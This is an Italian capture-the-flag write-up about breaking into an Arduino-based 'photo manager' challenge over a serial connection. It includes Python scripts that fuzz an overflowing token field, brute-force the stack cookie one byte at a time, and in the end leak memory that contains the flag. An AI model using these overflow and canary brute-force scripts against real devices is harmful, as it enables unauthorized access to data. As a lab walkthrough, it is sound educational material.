Descrizione della challenge:
> We have recently been informed that a group of hackers exploited a
> vulnerability in a PC within another very secure network. Our
> operative says the hacker in charge took a snapshot of the password,
> which they stored in their secret hidden-away database.
> 
> Today we found a photo manager service running on the internet. This
> service can be linked to the hacker who retrieved the passwords. From
> the size of the photo manager we can see they stored lots of pictures,
> so we are hoping they stored the password on their photo manager
> too. Can you breach their photo manager and take a quick look?


Una volta caricato il binario sull'Arduino, collegandoci con il serial monitor (baudrate 19200) ci viene presentata questa finestra:
```
[1] Login
[2] Memory management
```

Proviamo le varie voci di menu:

Con `1` ci viene chiesto di inserire un token di accesso
```
Please authenticate yourself with your hardware token
Please insert token. (8 characters)
Token can only contain the characters [A-Z/a-z/0-9]
```

Se inseriamo una stringa con caratteri speciali o minore di 8 caratteri ci ritorna il messaggio di errore `Hardware tokens are not of given ASCII sub-set. Aborting.`

Se invece proseguiamo con l'inserire una stringa anche più lunga di 8 caratteri, prosegue con mostrare i primi 8 caratteri inseriti dall'utente

```
Please authenticate yourself with your hardware token
Please insert token. (8 characters)
Token can only contain the characters [A-Z/a-z/0-9]

> ABCDEFGHIJKLMNOP....

Welcome ABCDEFGH
[1] Login
[2] Memory management
```

Con `2` viene mostrata un'informazione sulla memoria disponibile:
```
Total memory space: 4096 bytes
Memory space used: 3979 bytes
```

La memoria utilizzata però varia ad ogni esecuzione del programma.

Se inseriamo un valore diverso da 1 o 2, ci riporta al menu di selezione, quindi proviamo a verificare se è possibile violare il token di accesso

Se inseriamo una stringa di grandi dimensioni, possiamo notare un messaggio di errore al posto del "Welcome" precedente:
```
[1] Login
[2] Memory management

> 1

Please authenticate yourself with your hardware token
Please insert token. (8 characters)
Token can only contain the characters [A-Z/a-z/0-9]

> AAAAAAAAAAAAAAAAAAAAAAAAA....

Stack cookie corrupted.
[1] Login
[2] Memory management
[1] Login
[2] Memory management

```

![Bello spaccare tutto](./smash.jpg)

Possiamo notare l'overflow di una variabile.
A differenza di un sistema standard però, data l'architettura dell'Arduino, non potrà portarci ad avere code execution.

Questo perché l'architettura AVR su cui è basata Arduino, non rispetta il modello di Von Neumann ma Harvard: in quest'ultima l'area dati è fisicamente separata dall'area istruzioni, perciò non possiamo inserire nello stack codice eseguibile.

![Architettura Harvard](./Harvard_architecture.png)

Abbiamo verificato inoltre che l'errore si presenta con la stringa di 256 caratteri ma non con una da 26, proviamo a verificare quale è la dimensione massima della stringa che possiamo inserire

Per fare ciò utilizziamo la tecnica del fuzzing, ovvero usiamo input non propriamente validi tali da provocare nel programma un comportamento non previsto.

```python
import serial

s = serial.Serial('/dev/ttyACM0',baudrate=19200, timeout=2)
line = s.readlines()
s.timeout = 0.1
for size in range(255,27,-1):
    smash = b'A' * size
    print(f"Testing with size {size}")
    s.write(b'1\n')
    s.readlines() 
    s.write(smash+b'\n')
    line = s.readlines()
    print(line)
    if b'Stack cookie corrupted' not in line[0]:
        break

print(f"Dim stringa {size}")
s.close()
```

Lanciando più volte lo script, vediamo che la dimensione della stringa non è costante ma è variabile. Usando il menu `[2] Memory management` però possiamo ricavare la relazione presente tra la dimensione di questa stringa e la memoria disponibile

![Screen offset](./offset_costante.png)

Quindi confermiamo che la stringa effettiva ha dimensione massima `Memoria totale - memoria libera - 8`

Ora possiamo provare a ricavare il contenuto dello stack cookie/canary presente

```python
...
for i in range(255,1,-1): # Escludiamo \0
    smash = b'A' * size
    smash += i.to_bytes(1, 'little')
    s.write(b'1\n')
    s.readlines() #Lettura del messaggio di login
    s.write(smash+b'\n')
    line = s.readlines()
    if b'Stack cookie corrupted' not in line[0]:
        print(f"Primo carattere cookie: {i} {hex(i)}")
        print("Ricevuto: ")
        print(line)
        break
...
```

Lanciando anche questo più volte, si nota che il primo byte dello stack cookie è proprio la dimensione dell'area della stringa utente!

![Primo byte stack cookie](./primo_byte_cookie.png)

Proseguiamo quindi a trovare il secondo byte:
```python
...
for i in range(1,256,1):
    smash = b'A' * size
    smash += size.to_bytes(1, 'little')
    smash += i.to_bytes(1, 'little')
    s.write(b'1\n')
    s.readlines()
    s.write(smash+b'\n')
    line = s.readlines()
    if b'Stack cookie corrupted' not in line[0]:
        print(f"Secondo carattere cookie: {i} {hex(i)}")
        print("Ricevuto: ")
        print(line)
...
```

Qui possiamo notare che il byte successivo sembra il numero di caratteri effettivo del nome utente:
![Secondo byte stack cookie](./secondo_byte_cookie.png)

Proseguendo però con l'esecuzione, arrivati a `0xff` viene stampata una porzione di memoria, compresa la flag:
![Flag](./flag.png)